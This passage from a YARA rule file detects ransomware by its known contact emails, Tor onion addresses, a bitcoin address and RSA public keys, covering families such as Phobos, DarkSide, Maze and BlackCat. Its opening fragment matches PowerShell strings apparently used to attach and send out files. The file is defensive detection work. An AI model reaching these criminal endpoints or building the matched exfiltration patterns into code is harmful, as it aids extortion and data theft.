		$s5 = "$($env:HOMEPATH)\\" ascii
		$s6 = "|ForEach-Object ToString X2) -join ''" ascii
		$s7 = ".Attachments.Add($" ascii

	condition:
		5 of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Goldenaxe
{
	meta:
		description = "Detects files referencing identities associated with GoldenAxe ransomware"
		author = "ditekShen"
		id = "cd6486eb-742f-50fb-bd99-c5d778886477"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L82-L91"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "2540da85880dc08b51a2d096cefd8ed3cb14ccd171b71b434ccf26e7c5f1b54b"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "xxback@keemail.me" nocase ascii wide
		$s2 = "darkusmbackup@protonmail.com" nocase ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ransomwareexx
{
	meta:
		description = "Detects files referencing identities associated with RansomwareEXX Linux ransomware"
		author = "ditekShen"
		id = "dfcff8cb-c50c-559e-b5b9-8c2cdac7a3dc"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L142-L150"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a83ada5d29c6d62a292c4b3a1379558cddcaf63d97dbdfc6afd27cc52f6f656d"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "france.eigs@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Phobos
{
	meta:
		description = "Detects files referencing identities associated with Phobos ransomware"
		author = "ditekShen"
		id = "cee09220-4038-5190-b595-28f67c845588"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L152-L161"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "cf9e163d2315d465afb47bf83f30d5d27e14c4cbbc1c235dcb15b75fb509ba7d"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "helprecover@foxmail.com" ascii wide nocase
		$s2 = "recoverhelp2020@thesecure.biz" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Epsilon
{
	meta:
		description = "Detects files referencing identities associated with Epsilon ransomware"
		author = "ditekShen"
		id = "acdeb3b1-872b-5892-9dfe-2e506f767da2"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L163-L171"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "163694ed2ae181764fc6e62027487d183114be35a689dd44d4d9761149df244b"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "neftet@tutanota.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Thanos
{
	meta:
		description = "Detects files referencing identities associated with Thanos ransomware"
		author = "ditekShen"
		id = "22ffb4c9-f113-5d3e-a466-6c384c0c6e8a"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L173-L182"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "039ea384136a1aaa261702ed75ab9358aaa1ec2d5a8d35fe4789647f39490c7c"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "my-contact-email@protonmail.com" ascii wide nocase
		$s2 = "get-my-data@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Vovalex
{
	meta:
		description = "Detects files referencing identities associated with Vovalex ransomware"
		author = "ditekShen"
		id = "95e9ddce-8a19-59f1-baf4-bdac61c9c396"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L184-L192"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "0e8b426e55c1efaf59e5f255f1da9cdfbb509561d3f7ea5baa2815c3131866eb"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "vovanandlexus@cock.li" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Alumnilocker
{
	meta:
		description = "Detects files referencing identities associated with AlumniLocker ransomware"
		author = "ditekShen"
		id = "64b6aff8-3758-5837-b814-e2505a9c12a3"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L194-L202"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "aeab9cb2b2da246e1863cd1102d901d322017d0b309e852d83e4f66f6e4bdd22"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "alumnilocker@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Doejocrypt
{
	meta:
		description = "Detects files referencing identities associated with DoejoCrypt ransomware"
		author = "ditekShen"
		id = "bdf67fd3-8614-52f0-8804-9905f067a848"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L204-L213"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b76996ef413d017fa571115f7331154c808fed0f1b1e0c97241cadbbef260a00"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "konedieyp@airmail.cc" ascii wide nocase
		$s2 = "uenwonken@memail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Purge
{
	meta:
		description = "Detects files referencing identities associated with Purge ransomware"
		author = "ditekShen"
		id = "2a0f2c69-b179-5e48-9db6-be25e329f72b"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L215-L224"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "49f3f5a88212d4bed1f0237a4437fb537e84cd6dd26c5fe224250f3b6e39d384"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "rscl@dr.com" ascii wide nocase
		$s2 = "rscl@usa.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Zeoticus
{
	meta:
		description = "Detects files referencing identities associated with Zeoticus ransomware"
		author = "ditekShen"
		id = "4d5f0d6d-f792-563d-9a9b-1986f5af8743"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L226-L235"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "7a83b15b0c8e81f67d11f8b5d9a43ba4e1e3a0f6741ddd0daafe4e742dd91cd8"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "anobtanium@tutanota.com" ascii wide nocase
		$s2 = "anobtanium@cock.li" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Unlockyourfiles
{
	meta:
		description = "Detects files referencing identities associated with UnlockYourFiles ransomware"
		author = "ditekShen"
		id = "fdc3ec49-66cc-5a0b-87a6-3660dd6f3b72"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L279-L288"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a33dae7f08eb0c2415fbfdadf2cbbf90c68bc802352277422c6d0a2dbd62cd82"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "4lok3r@tutanota.com" ascii wide nocase
		$s2 = "4lok3r@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Darkside
{
	meta:
		description = "Detects files referencing identities associated with DarkSide ransomware"
		author = "ditekShen"
		id = "7b29b9b9-4657-551e-b770-880a2278ef60"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L290-L299"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "3c6cdb15cad19f1db38c0fe03ecb24d5cd4861a699aa2bee0f99b8dddacc8bd1"
		score = 75
		quality = 73
		tags = ""
		hash1 = "bafa2efff234303166d663f967037dae43701e7d63d914efc8c894b3e5be9408"

	strings:
		$s1 = "breathcojunktab1987@yahoo.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Spyro
{
	meta:
		description = "Detects files referencing identities associated with Spyro ransomware"
		author = "ditekShen"
		id = "9a42a9fd-dfaf-5719-acae-e7c3b92ecdc9"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L301-L310"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b12b24b7b1b9800d249fd322532d957ddfc020c495ca89414d8d7e9fa7d58eb7"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "blackspyro@tutanota.com" ascii wide nocase
		$s2 = "blackspyro@mailfence.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ryzerlo
{
	meta:
		description = "Detects files referencing identities associated with Ryzerlo / HiddenTear / RSJON ransomware"
		author = "ditekShen"
		id = "1e8b79dc-4a81-5126-a7a3-ad7a2e8f62bf"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L312-L320"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "2d925cac74411c3e408d674e27a27ae029d39977026a79df8f90edae345a31db"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "darkjon@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ranzylocker
{
	meta:
		description = "Detects files referencing identities associated with RanzyLocker ransomware"
		author = "ditekShen"
		id = "33478dc4-c0ec-5cc8-8620-79e770f6a773"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L354-L363"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "dc345257a3cca82a95e20505c94e90d8ac42240e1491ea1f34be121871673e26"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "eviluser@tutanota.com" ascii wide nocase
		$s2 = "evilpr0ton@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Alkhal
{
	meta:
		description = "Detects files referencing identities associated with AlKhal ransomware"
		author = "ditekShen"
		id = "32e14a6e-fc2e-5c0a-b8e3-33e219923d90"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L365-L374"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "bd2d66a9cd33ab15b451158cd6c0e6579735653611ee2e6c8045a5807091938d"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "alkhal@tutanota.com" ascii wide nocase
		$s2 = "cyrilga@tutanota.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Rapid
{
	meta:
		description = "Detects files referencing identities associated with Rapid ransomware"
		author = "ditekShen"
		id = "a1c6f3c0-2fec-5d96-9965-8129a843ae90"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L428-L436"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ea82a3fcb1d836e1c250e9a576064e1babdb82b4970555260af2eb68726cfd16"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "jimmyneytron@tuta.io" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Satana
{
	meta:
		description = "Detects files referencing identities associated with Satana ransomware"
		author = "ditekShen"
		id = "a362d4ca-d475-5392-a3ac-45337425d8e7"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L438-L447"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "6d82e2497044518cee1b56da85f1ad6ac7934eec9ca68501932d55add4236d45"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "adamadam@ausi.com" ascii wide nocase
		$s2 = "XsrR2he2Z8un5ysGWnJ1wveZRPRS96XEoX" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Diavol
{
	meta:
		description = "Detects files referencing identities associated with Diavol ransomware"
		author = "ditekShen"
		id = "ea499318-ed5b-5597-8f9f-4ece7942cf4b"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L482-L491"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "c72f4d7854f7ba813c4872d47aad69edb8c2927f380b9213ced1aca52454eee5"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "/noino.5fws6uqv5byttg2r//:sptth" ascii wide nocase
		$s2 = "https://r2gttyb5vqu6swf5.onion/" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Maze
{
	meta:
		description = "Detects files referencing identities associated with Maze ransomware"
		author = "ditekShen"
		id = "7cc11912-e5d2-5477-ab9b-0c470bb5e1d6"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L513-L521"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "46070d46c502837e5fb87d0fb75244a1a21e90b4e0ce4b73c408b8dc67fe1bcb"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "getmyfilesback@airmail.cc" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Lokilocker
{
	meta:
		description = "Detects files referencing identities associated with LokiLocker ransomware"
		author = "ditekShen"
		id = "ab2cf390-4544-54ed-913c-d463d0f1bdb0"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L523-L531"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "1ab9a2ce7e39d916b389e2adb975e3558ddb7d87f7e9494e6b20cb25edd3cb84"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "Unlockpls.dr01@yahoo.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Blackcat
{
	meta:
		description = "Detects files referencing identities associated with BlackCat ransomware"
		author = "ditekShen"
		id = "21038f8e-73cd-59d2-9eb3-6947d263ab79"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L533-L569"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "eb0a4d26170f030775f778cc524749ca283dfa983f84bd364e4df6321eb96cf1"
		score = 75
		quality = 73
		tags = ""

	strings:
		$pk1 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0B0ni9tyKHSJmU6gc1iRwNTklYocRKmLPUyOthUIHnZHwL1M2pKlMBwXx81bboVS6Cf8YaCoWW1bCmLwPX421sG22xkmtMy/SfiG8jaYtYiA7r7hOdIUnJgRo6vDvNafZlSD32tFVVjuX8Ec79qj2FM7/MmNcseUgpIQaEACuZcSzMK+jZA4BLT9b5Akkec2hPOXGTPmgaXjL9EJE+0rhNZcm/m6xe4/S5eL2kSCVsNUeG8xWuSO2kDRS8xY3rtJOCNEdqZp1rxzTkhgj3hHqr7AoFAkxNblQ538JcdF5+CGINxckA/ldmP7wQd92tmFk2vcl2WeQykFwMM6L6MsQwIDAQAB" ascii wide
		$pk2 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA49gzJwP9UwEuYQZT1cdgSpxG6z8TVNLPfS4Qwd3vpWHEOAuvi8JGVEpHPGZnrD1QFoDLSTva3PZ4mqtIVO79GOYb5uQkP7LdJGWbLAjUGptVGmB67jKOOLLrjmuBDHpJXSOGG/vw5vajr4MhNnsvoBLPOC0AOzPM6GBDgKdC9zdUGNEreAjOR4neqwZ2jfYl5k5e3eRF86hmWhGXJQaU1uTmDJwgQIzmUZKo+YCfAHbEbSA4HhsumJfw0MJN7RfKPEQkEVvRIBibHnJuIp1bxk3IGPzTCbyQLHMVLz8wgElEexu8/aO3FT6w4uPY3qD+r2W+ri7xIdEN/pTz6TBKvwIDAQAB" ascii wide
		$pk3 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8tKPNFCbU5Unr9jxlTk4RmUdVhcRydJFts6hMpLzcAXIR2yxiNC0QiF4UovAIpGwX6kxOW7kOaOvABJQP6QENMNSg030VlLoTP+ndfFwIt+X+RUflG4UWPE8yu+kzGpCwp7UjX+hD/SpFbSFRRh3BvL3vEq04DzE0AzifEBE4yxKpLsrMsXyZzWy9Nza8NTO2jrBxoEVM2xCLkULp0wZEPDwgeKGkoxMzqavVWBC+Vxi0atKstbo7/TloNenPagl/eUErk9C8tT67zKgbEh3TFtREgaxa/yrjBvN48BU8JGGxLxy4AeGF0vOUdD0WkJsWYzLVg21ApgJaCDr5zDPuQIDAQAB" ascii wide
		$pk4 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApw3tWdMaWJvNf2Mejy5H0Y6kuj+lstNpwFyismGDEYhWKPps9c68xl+84o6uLKfqPzNvLnSxlVa6DitcJGeKJEQkzN+C1e1KsfzM63jHybREB2hs+dHbqBq4dbamIQcTrrr4mKzuHJ7aok4mlpRx2Un1XOJaodoV7xOHO7ui5v6uK39MJ3rvitSEBvv5oI0WDlp3IFmtd6UM6r2nygY1ncAUuasalZgF1Vaz7VXOWyX2ReQHbYWWRCR1qyKMQcBtjT5POXx9B8ek1pnU4p65kGe9M794Bhhh20GN24gY5a+zwXwstaNTO9luwd4xjjRQAVsDgjrjkzti27G11ICn6wIDAQAB" ascii wide
		$pk5 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq8kj5LQJngPsY7AhTaJsUXc5FrSGeKS5gw5PIqk2QPM9TY6+us8TRRzWZ7rGk1zns2klpzpRMUzLIqB8lpCkJjqkOUGfgqs+HN4VIOpoJgFY897xstJCxTc+8pYQEsSqClxJllscU0okkLSQqndIR2Gznlg3qfcwyncJAFBInyqM+L4kbwCQZ6x5HNiLe2lJn8RP2aDiMI+RS1uLYron2G7rxDTUQnxThMtgLAeko8ulaB3TpB0g4lmHCenkEZeBNs81986+MjHnv7KkiscZ7ZrezKjNaIxRs8BAcD9y+Q9QQxCvZMS01ITNXcgiItbA4dsGq1fPJ42yBkkiIodsEQIDAQAB" ascii wide
		$pk6 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqEoytNrMZRoqyIsFpcjiqVWpuV+cC9jS1umXNg/AnJF/xE7LONAmb1p8Dsx1igIUd65IXfFUxmJjFO5hf8LIBzvjUbBll4lbSgGTAUHa3Jbmr/imle6QftmY32J7dDb4WuJUOx+vLNT0I72CESiyotSzwgvLwjyubTmzTJMkqviYOcgDj45NVOx669cG6FWEaJo3PUZzRx9LS6pkOn8tW+W4NzmHMcrma+LOakan7NU6Khv5Hf5ARNsAA+KvDfP1WXJ/VsLXj6x8SdX0v2iS+y58ehUUmlxc8HNsYdOGFwrwYX9zLyJDedsbPg02c4AE4KXt8vH4+j4lVFtruSy4vwIDAQAB" ascii wide
		$pk7 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt9uYkHzaizNXg/S11ncTTLybkMtqrKW8gg6TyzbGWnRNROl9O+l1VZBLG0xiMt1mZbuStl8Lt3l1vlkMa92kgLjN+UfKmq3KhBEheN2uMmR0WpwV83kceVRmzr5lug4RyQ/xA6/OXK4NptDIT4L6CUTBWMyk2mmY0Cq9HyyrjdnHeAXWAcQGFEac7W4jTjONZqI+lgScPewS+cPFnz1hAD0IAqzj5X2mZVSfFGR3tDoIe42jw5wb6W2yi8zb3mgKrGtTBbw0Ppj0UgKrmdN5iFmfUQHLEzKAakDggLcBtrW1o5+4WMaZOLw8maU5byvjXu3F3i3GdQe8SKTYcVK5OQIDAQAB" ascii wide
		$pk8 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAugqZ4ATE9+9FqununW/DBvGosnUX/bNxQzMYUmE14GJIbNa6vwYSNXOlG09mvdAqZqD3lXihWDjy25+gzqSeS+Fs2qNyTdfGPA8iu2xx5RRUXKLGFThxtIzg3fohAK3+LxJVhxtuITAT38IHacc7dVLHsrddu4UDjiHGFdvXjB55Nwe5cu1BYylHsARMYycBA2FwLP57cKvc2/C3OXBAF6qbsVXBcyFhrKOOYA/+5IjFfEhgHy2FLHRf8lmPQPbSlrM6dk+W4D5KVqOPx/eFp0geUJJlmlre3flI29qWS20bkGqAEz9j07y69HGYN9Nt7+DRgBwrpNo/EkZkuaSTtQIDAQAB" ascii wide
		$pk9 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuuAQlnowSGaSi2XgnwaHQAFZ6e7C0SwpAyyLTncJ4l5cwFbM+mwnV+iV3a+ert8WqOmW1aKOCjTPXrXNoirQgboVpLfhIIT1uOOss4O8lodRxgB6QrLCI7PYMZ+8VgIdEPPzsjmTFLxFc7DERxnSjhGdRQIjZNjm7bGScJD0MayDL9KTkVdJtC+C9n5dwEwg6XtQbwLDeaGZaByOgB/zR6tlcPQCNU9rj1qfcVrI/dFW4br/NnJbqrH714z+dvCa18IJTcu3kW74CAilvHrl5qFDd8CCQhjLrjQDPxAoCba9aXKr6dwt34/MU0tVRTYjzMAxR4yTh3oEjVT+HifvVwIDAQAB" ascii wide
		$pk10 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwcPjnPl8bI1A0iudX70FKkTjnLjHyetHN2kAIcyOG10K8vm67n/Ma9mAnoDggD3D6UtAbwjvHwPW1m9WF+MrnBXmBizE0JpwOLtVFcHeVLJXlYn/C5RNZziTCwjauH6TlT7Mo/oHfg7nX4IXEuaeAZz8g9ioeJ1Lydi9ZZM1gmdNk8KuKR0zrrJ6MMAGrhMtblLFVwtMn7IlNjT/BgSL4pDyNa++wI5P4R2rMykJwGu/7o2kKE2IFimtFDyZ5a+CX46cdKt7uo5eKFiqf/jTes9/y5AgoS69mt4fRvWFhP7qHXRO2gG8XAc+9suhiuVUWZTAu3xXz5VsmBtk8pzcpwIDAQAB" ascii wide
		$pk11 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwMQXFMtYf60KrbUVwNVoPhhrCTNMY3Zv+/WULZRZfJ4dMhYozDxtRVdtBDKtuYuHCGLu/Ymf9wKFFXgVH3En7qI1sU2UdjNR4086X8oSTMUn/GwEAEIZAHtSFuk6AXcXW+eO0yxPF+lt5AZcNnJocWBVZ8RWGvsQdtGgtZalttAynROC4RUGkvD1h1ssMteHWneFLpfzSPGlbu0s0cemsrTPmhexGIenup/YjNdmhbfvvYE9kZfPebGtZHw6oQXWcG7sAlvkGciJl3Eo9FznNj0K+v8WQW5L/UbosZaYVJbxlbtySvqUqZbkLKsmp91tr9bvTiDMZuXZS7iHVqchUQIDAQAB" ascii wide
		$pk12 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxbKVxwYe4PpnPm0XtuqShDqFWCFRBw0tYo2vmLwVPlwa+0+ox8+nF0mzWC3ZZT2XkGSodszosOoocfKAwOjQnA+4/Hokl4hgG6K8O7wWuWlvgo4fkcZShy2cMY9FaC6e4bMfurlDFt7OVrKKWAyEGv49Etq6LNoyl5ddM/XmspG52gscRoIcOTwBL4bD8nVcamZXqE4j2mS62HicQ6q9YgRVs1PLbgVPbg8c2rFzpN1e8wZdPtvyGON0m3CmxsYa63yianbnBAS4WnxEnoI7eCZZNkblr+kZB4J9War5VYHu9lFw4XWeuHget/Rn8oGCJOMHkZMz23NpUVaX9htQAwIDAQAB" ascii wide
		$url1 = "://zujgzbu5y64xbmvc42addp4lxkoosb4tslf5mehnh7pvqjpwxn5gokyd.onion" ascii wide
		$url2 = "://alphvmmm27o3abo3r2mlmjrpdmzle3rykajqc5xsj7j7ejksbpsa36ad.onion" ascii wide
		$url3 = "://2cuqgeerjdba2rhdiviezodpu3lc4qz2sjf4qin6f7std2evleqlzjid.onion" ascii wide
		$url4 = "://aoczppoxmfqqthtwlwi4fmzlrv6aor3isn6ffaiic55wrfumxslx3vyd.onion" ascii wide
		$url5 = "://b4twqa2mvob3s6uvuyfra5xk3qgps2v5kkt7k2qnb7rpdu3j4fkntead.onion" ascii wide
		$url6 = "://b6v4ojs7jfvftvcoagjxp7qz33yeljydqy6afzsh26vqbzcjwz4b3zad.onion" ascii wide
		$url7 = "://htnpafzbvddr2llstwbjouupddflqm7y7cr7tcchbeo6rmxpqoxcbqqd.onion" ascii wide
		$url8 = "://id7seexjn4bojn5rvo4lwcjgufjz7gkisaidckaux3uvjc7l7xrsiqad.onion" ascii wide
		$url9 = "://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd.onion" ascii wide
		$url10 = "://odf3dt34tkqndw5h2l5gt2gwwd3jct5rwwjusbd3vlin2jueyv2qkgid.onion" ascii wide
		$url11 = "://rfosusl6qdm4zhoqbqnjxaloprld2qz35u77h4aap46rhwkouejsooqd.onion" ascii wide
		$url12 = "://sty5r4hhb5oihbq2mwevrofdiqbgesi66rvxr5sr573xgvtuvr4cs5yd.onion" ascii wide
